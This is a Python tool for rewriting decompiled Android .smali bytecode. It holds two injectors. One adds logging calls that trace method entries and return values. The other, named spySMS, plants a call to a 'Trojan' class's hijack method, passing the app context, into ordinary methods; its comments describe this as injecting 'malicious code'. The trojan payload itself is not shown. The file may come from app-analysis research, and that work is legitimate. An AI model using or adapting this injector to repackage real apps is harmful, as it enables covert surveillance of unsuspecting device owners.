import time
import helper 
import process
import metadata
import smali_parser
		
def get_instruction_from_type(trace_reg, returned_reg_type, returned_reg=None):
	
	allowed_types = [	'Z', '[Z', 'Ljava/lang/Boolean;', '[Ljava/lang/Boolean;',
						'B', '[B', 'Ljava/lang/Byte;', '[Ljava/lang/Byte;',
						'S', '[S', 'Ljava/lang/Short;', '[Ljava/lang/Short;',
						'C', '[C', 'Ljava/lang/Character;', '[Ljava/lang/Character;',
						'I', '[I', 'Ljava/lang/Integer;', '[Ljava/lang/Integer;',
					# Long and Double got 64 bits regs (wide directive)
					#	'J', '[J', 'Ljava/lang/Long;', '[Ljava/lang/Long;', 
						'F', '[F', 'Ljava/lang/Float;', '[Ljava/lang/Float;',
					#	'D', '[D', 'Ljava/lang/Double;', '[Ljava/lang/Double;',
						'Ljava/lang/String;', '[Ljava/lang/String;',
						'Ljava/lang/Object;', '[Ljava/lang/Object;', #'Lorg/json/JSONObject;', 
						'Ljava/net/URI;', 'Ljava/net/URL;', 'Landroid/ares/location/Address;', 'Ljava/net/URLConnection;', #'Ljava/net/HttpURLConnection;',
					    'Lorg/apache/http/HttpEntity;', #'Ljava/io/InputStream;' 
					]
	
	if (returned_reg_type in allowed_types):
		instruction = ('\tinvoke-static {%s, %s}, Landroid/ares/Logger;->printStackTrace(Ljava/lang/String;%s)V \n')%(trace_reg, returned_reg, returned_reg_type)
	else:
		instruction = ('\tinvoke-static {%s}, Landroid/ares/Logger;->printStackTrace(Ljava/lang/String;)V \n')%(trace_reg)
	
	return instruction	
	
def printStackTrace(file_path, file_metadata, keywords=None):
	'''
	process the methods of a .smali file.
	
	:param 	file_path:		path of the .smali file
	:param 	my_tag:			debug tag to use in logcat
	:param 	file_metadata: 	dictionary containing the metadata of the methods inside 
	of a .smali file
	:type	file_path:		str
	:type	my_tag:			str
	:type	file_metadata:	dict
	'''	
	buffer = []
	method_data = []
	valid_regs = []
	process = False
	
	# If we do not filter methods based on keywords
	if (keywords is None):
		with open(file_path, 'r') as file:
			for line in file:
				# We ignore the abstract methods
				if ((line.find('.method ') == 0) and (line.find('abstract ') < 0)):
					words = line.split()
					# Retrieving the method data from the meta-data
					method_data = metadata.get_meth_data(words[-1], file_metadata)
					returned_reg = method_data[3]
					valid_regs = helper.get_valid_regs(returned_reg['reg'], method_data[2])
					# The returned register index must be below 16, the method must not contains any monitor directive
					# must not be alredy edited and must have less than fitfteen register
					if ((int(returned_reg['reg'][1:]) < 16) and (len(valid_regs) > 0) and not (method_data[4]) \
					and not ('printStackTrace()V' in method_data[5])):	
						process = True
					else:
						process = False
							
					buffer.append(line)
					
				elif ((line.find('.registers ', 0, 20) > 0) and (process)):	
					buffer.append(line)	
					buffer.append('\n\tinvoke-static {}, Landroid/ares/Logger;->printStartTrace()V \n')
					
				elif ((line.find('return', 0, 20) > 0) and (process)):
					# We mark the method as processed
					buffer.append('\t#printStackTrace()V has been injected on {0} \n'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())))
					method_data[5].append('printStackTrace()V')
					# We set the reg containing the trace
					
					buffer.append('\tconst-string {0}, "{1}.{2}" \n'.format(valid_regs[0], method_data[0], method_data[1]))
					# We trace the end of the method including the returned reg value
					
					instruction = get_instruction_from_type(valid_regs[0], returned_reg['reg_type'], returned_reg['reg'])
					buffer.append(instruction)
					
					buffer.append(line)	
				
				# Resetting the vars
				elif ((line.find('.end method') == 0) and (process)):
					method_data = []
					valid_regs = []
					process = False
					
					buffer.append(line)
					
				else:
					buffer.append(line) 				
		
		# Overwritting the .smali file
		with open(file_path, 'w') as file:
			for line in buffer:
				file.write(line)	
	
	# If we filter methods based on keywords
	else:
		with open(file_path, 'r') as file:
			for line in file:
				# We ignore the abstract methods
				if ((line.find('.method ') == 0) and (line.find('abstract ') < 0) and (any(keyword in line for keyword in keywords))):
					words = line.split()
					# Retrieving the method data from the meta-data
					method_data = metadata.get_meth_data(words[-1], file_metadata)
					returned_reg = method_data[3]
					valid_regs = helper.get_valid_regs(returned_reg['reg'], method_data[2])
					# The returned register index must be below 16, the method must not contains any monitor directive
					# must not be alredy edited and must have less than fitfteen register
					if ((int(returned_reg['reg'][1:]) < 16) and (len(valid_regs) > 0) and not (method_data[4]) \
					and not ('printStackTrace()V' in method_data[5])):	
						process = True
					else:
						process = False
							
					buffer.append(line)
					
				elif ((line.find('.registers ', 0, 20) > 0) and (process)):	
					buffer.append(line)	
					buffer.append('\n\tinvoke-static {}, Landroid/ares/Logger;->printStartTrace()V \n')
					
				elif ((line.find('return', 0, 20) > 0) and (process)):
					# We mark the method as processed
					buffer.append('\t#printStackTrace()V has been injected on {0} \n'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())))
					method_data[5].append('printStackTrace()V')
					
					# We set the reg containing the trace
					buffer.append('\tconst-string {0}, "{1}.{2}" \n'.format(valid_regs[0], method_data[0], method_data[1]))
					
					# We trace the end of the method including the returned reg value
					instruction = get_instruction_from_type(valid_regs[0], returned_reg['reg_type'], returned_reg['reg'])
					buffer.append(instruction)
					
					buffer.append(line)	
				
				# Resetting the vars
				elif ((line.find('.end method') == 0) and (process)):
					method_data = []
					valid_regs = []
					process = False
					
					buffer.append(line)
					
				else:
					buffer.append(line) 				
		
		# Overwritting the .smali file
		with open(file_path, 'w') as file:
			for line in buffer:
				file.write(line)	
				
def spySMS(file_path, file_metadata, code_to_inject, keywords=None):
	'''
	process the methods of a .smali file.
	
	:param 	file_path:		path of the .smali file
	:param 	my_tag:			debug tag to use in logcat
	:param 	file_metadata: 	dictionary containing the metadata of the methods inside 
	of a .smali file
	:type	file_path:		str
	:type	my_tag:			str
	:type	file_metadata:	dict
	'''	
	buffer = []
	method_data = []
	valid_regs = []
	process = False
	
	# If we do not filter methods based on keywords
	if (keywords is None):
		with open(file_path, 'r') as file:
			for line in file:
				# We ignore the abstract and static methods (to get the ApplicationContext)
				if ((line.find('.method ') == 0) and (line.find('static ') < 0) and (line.find('abstract ') < 0)):
					words = line.split()
					# Retrieving the method data from the meta-data
					method_data = metadata.get_meth_data(words[-1], file_metadata)
					returned_reg = method_data[3]
					valid_regs = helper.get_valid_regs(returned_reg['reg'], method_data[2])
					# The method must contains at least one free reg, must not contain any monitor directive
					# must not be alredy edited and must have less than sixteen register for the p0 dependency
					if ((len(valid_regs) > 0) and (len(method_data[2]) < 16) and not (method_data[4]) \
					and not ('hijack(Landroid/content/Context;)V' in method_data[5])):	
						process = True
					else:
						process = False
							
					buffer.append(line)
					
				elif ((line.find('return', 0, 20) > 0) and (process)):
					# We mark the method as processed
					buffer.append('\t#hijack(Landroid/content/Context;)V has been injected on {0} \n'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())))
					method_data[5].append('hijack(Landroid/content/Context;)V')
					
					# We get the ApplicationContext
					buffer.append('\tinvoke-virtual {p0}, Landroid/ares/Trojan;->getApplicationContext()Landroid/content/Context; \n')
					buffer.append('\tmove-result-object {0} \n'.format(valid_regs[0]))
					
					# We inject our malicious code
					buffer.append('\tinvoke-static {%s}, Landroid/ares/Trojan;->hijack(Landroid/content/Context;)V \n'%(valid_regs[0]))
					
					buffer.append(line)	
				
				# Resetting the vars
				elif ((line.find('.end method') == 0) and (process)):
					method_data = []
					valid_regs = []
					process = False
					
					buffer.append(line)
					
				else:
					buffer.append(line) 				
		
		# Overwritting the .smali file
		with open(file_path, 'w') as file:
			for line in buffer:
				file.write(line)	
	
	# If we filter methods based on keywords
	else:
		with open(file_path, 'r') as file:
			for line in file:
				# We ignore the abstract and static methods
				if ((line.find('.method ') == 0) and (line.find('static ') < 0) and (line.find('abstract ') < 0) and (any(keyword in line for keyword in keywords))):
					words = line.split()
					# Retrieving the method data from the meta-data
					method_data = metadata.get_meth_data(words[-1], file_metadata)
					returned_reg = method_data[3]
					valid_regs = helper.get_valid_regs(returned_reg['reg'], method_data[2])
					# The method must contains at least one free reg, must not contain any monitor directive
					# must not be alredy edited and must have less than sixteen register for the p0 dependency
					if ((len(valid_regs) > 0) and (len(method_data[2]) < 16) and not (method_data[4]) \
					and not ('hijack(Landroid/content/Context;)V' in method_data[5])):	
						process = True
					else:
						process = False
							
					buffer.append(line)
					
				elif ((line.find('return', 0, 20) > 0) and (process)):
					# We mark the method as processed
					buffer.append('\t#hijack(Landroid/content/Context;)V has been injected on {0} \n'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())))
					method_data[5].append('hijack(Landroid/content/Context;)V')
					
					# We get the ApplicationContext
					buffer.append('\tinvoke-virtual {p0}, Landroid/ares/Trojan;->getApplicationContext()Landroid/content/Context; \n')
					buffer.append('\tmove-result-object {0} \n'.format(valid_regs[0]))
					
					# We inject our malicious code
					buffer.append('\tinvoke-static {%s}, Landroid/ares/Trojan;->hijack(Landroid/content/Context;)V \n'%(valid_regs[0]))
					
					buffer.append(line)	
				
				# Resetting the vars
				elif ((line.find('.end method') == 0) and (process)):
					method_data = []
					valid_regs = []
					process = False
					
					buffer.append(line)
					
				else:
					buffer.append(line) 				
		
		# Overwritting the .smali file
		with open(file_path, 'w') as file:
			for line in buffer:
				file.write(line)	